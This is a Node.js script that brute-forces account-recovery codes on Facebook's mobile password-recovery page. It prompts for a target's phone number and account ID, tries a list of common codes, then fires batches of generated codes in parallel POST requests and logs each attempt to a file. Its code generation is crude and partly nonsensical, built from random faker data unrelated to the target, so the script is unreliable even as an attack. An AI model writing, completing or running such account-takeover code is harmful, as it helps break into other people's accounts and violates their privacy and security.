const readlineSync = require('readline-sync');
const axios = require('axios');
const fs = require('fs'); // A module that allows you to work with files
const crypto = require('crypto'); // A module that provides cryptographic functionality
const faker = require('faker'); // A module that generates fake data

// A dictionary of common codes
const dictionary = ["1234", "0000", "1111", "4321", "5555", "9999", "12345678", "87654321"];

// A function that generates a possible code based on some rules and randomness
function generateCode() {
    // For demonstration purposes, assume the code is the first four digits of the phone number and the last four digits of the account ID
    // In a real scenario, you would need to use some techniques to guess or obtain this information
    // Use faker to generate random phone numbers and account IDs
    const phoneNumber = faker.phone.phoneNumber('####');
    const accountId = faker.finance.account(8);
    // Use crypto to generate random bytes and convert them to hex
    const randomBytes = crypto.randomBytes(4).toString('hex');
    // Combine the phone number, account ID and random bytes to form a code
    const code = phoneNumber + accountId + randomBytes;
    return code;
}

// A function that checks the validity of a batch of codes
async function checkBatchValidity(codes) {
    // Create an array of requests with the codes and the targetInfo
    const requests = codes.map(code => axios.post(targetUrl, { code, targetInfo }));
    // Send all the requests at once and wait for the responses
    const responses = await Promise.all(requests);
    // Loop through the responses and check if any of them is valid
    for (let i = 0; i < responses.length; i++) {
        const response = responses[i];
        const code = codes[i];
        // Assume the response has a property called valid that indicates the validity of the code
        if (response.data.valid) {
            // If the code is valid, return it
            return code;
        }
    }
    // If none of the codes is valid, return null
    return null;
}

// A function that tries to brute force the code using a dictionary and a generator
async function bruteForceCode() {
    // Try the codes from the dictionary first
    const validCode = await checkBatchValidity(dictionary);
    // If a valid code is found, return it
    if (validCode) {
        return validCode;
    }
    // If not, try generating and checking codes until a valid one is found or the limit is reached
    // Set a limit for the number of attempts or the duration
    const maxAttempts = 100;
    const maxDuration = 60 * 1000; // 60 seconds in milliseconds
    // Initialize a counter for the number of attempts and a timer for the duration
    let attempts = 0;
    let startTime = Date.now();
    // Use a while loop with async/await to iterate over the codes and check their validity
    while (true) {
        // Increment the number of attempts
        attempts++;
        // Check if the limit is reached
        if (attempts > maxAttempts || Date.now() - startTime > maxDuration) {
            // Break the loop and return null
            break;
        }
        // Generate a batch of 10 codes
        const codes = Array.from({ length: 10 }, generateCode);
        // Check the validity of the batch
        const validCode = await checkBatchValidity(codes);
        // If a valid code is found, return it
        if (validCode) {
            return validCode;
        }
        // Log the codes and the results to the console
        console.log(`Generated codes: ${codes.join(", ")}`);
        console.log(`None of them is valid.`);
        // Append the codes and the results to a file
        fs.appendFile("results.txt", `Generated codes: ${codes.join(", ")}\nNone of them is valid.\n`, (err) => {
            if (err) throw err;
        });
    }
    // If the loop ends without finding a valid code, return null
    return null;
}

// Example usage:
const targetInfo = readlineSync.question("Enter the target's phone number and account ID separated by a comma: ");
const targetUrl = "https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&wtsid=rdr_1q6Vogj2mr2kpMQG9&_rdr";

try {
    bruteForceCode().then(validCode => {
        console.log(`The valid code on the specified page is: ${validCode}`);
        // Append the valid code to the file
        fs.appendFile("results.txt", `The valid code on the specified page is: ${validCode}\n`, (err) => {
            if (err) throw err;
        });
    });
} catch (error) {
    console.error(`Error: ${error.message}`);
}

